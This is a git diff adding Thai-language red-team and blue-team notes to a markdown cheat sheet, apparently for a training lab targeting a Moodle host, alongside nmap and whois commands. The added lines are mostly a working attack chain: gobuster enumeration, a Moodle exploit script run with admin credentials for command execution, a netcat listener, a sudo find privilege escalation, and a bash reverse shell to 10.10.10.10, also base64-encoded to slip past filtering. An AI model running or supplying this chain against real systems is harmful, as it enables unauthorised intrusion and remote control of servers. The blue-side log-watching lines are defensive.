@@ -1,5 +1,46 @@
 # Information Gathering
+nist
+identify ตรวจสอบว่าเรามีอะไรบ้าง
+protect การป้องกัน เช่นไฟร์วอร การใช้อุปกรณ์ป้องกัน
+detecton เฝ้าระวัง เช่น siem
+responsece การตอบสนอง
+recovery การกู้คืนระบบ
 ## 🔍 Information Gathering | การรวบรวมข้อมูล
+
+Red
+Gobuster
+-      gobuster dir --wordlist /root/Downloads/wordlist.txt -u https://moodle.mod.cyber/ -x php,txt,html,htm,sh,cgi,bak,json,zip,rar,sql -q -k
+Blue
+-      tail -f /var/log/apache2/access.log | grep security.txt
+
+Red
+หาเลข cve
+เช็คสิทธิ
+-      python3 moodle_exploit.py --url https://moodle.mod.cyber/ -username admin --password "123456" --courseid 2 --cmid 2 --cmd "whoami"
+Output: จะได้ สิทธ root
+-      www-data  
+
+C2 : https://www.revshells.com
+สร้างตัวรับ :
+-      rlwrap nc -nlvp 443
+output : connected
+-     whoami
+-     ip a
+-     sudo -l
+รวมคำสั่งยกรพดับสิทธิ
+https://gtfobins.github.io/
+-     sudo find -exec /bin/sh \; -quit
+-     whoami
+ยิง Revesr shells bash: /bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1
+-     python3 moodle_exploit.py --url https://moodle.mod.cyber/ -username admin --password "123456" --courseid 2 --cmid 2 --cmd "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"
+ถ้าไม่ได้ เปลี่ยนเป็น base64 : c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNDQzIDA+JjE=
+-      python3 moodle_exploit.py --url https://moodle.mod.cyber/ -username admin --password "123456" --courseid 2 --cmid 2 --cmd "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNDQzIDA+JjE=' | base64 -d | bash"
+
+
+Blue
+tail -f /var/log/apache2/access.log | grep security.txt
+
+
 Nmap
 1. Check port และ service: nmap -sV -p- 192.168.1.1
 3. Check Host 1 Up: ping 10.7.1.226
@@ -14,6 +55,7 @@ Nmap
 12. vuln : sudo nmap --script vuln 10.7.1.226
 13. sudo nmap -v -Pn 10.7.1.226
 14. cert : nmap -p 443 192.168.2.137 -sV --script=ssl-cert
+15. nmap -sV moodle.cyber -T5
 Whois
 1. whois facebook.com
 2. 
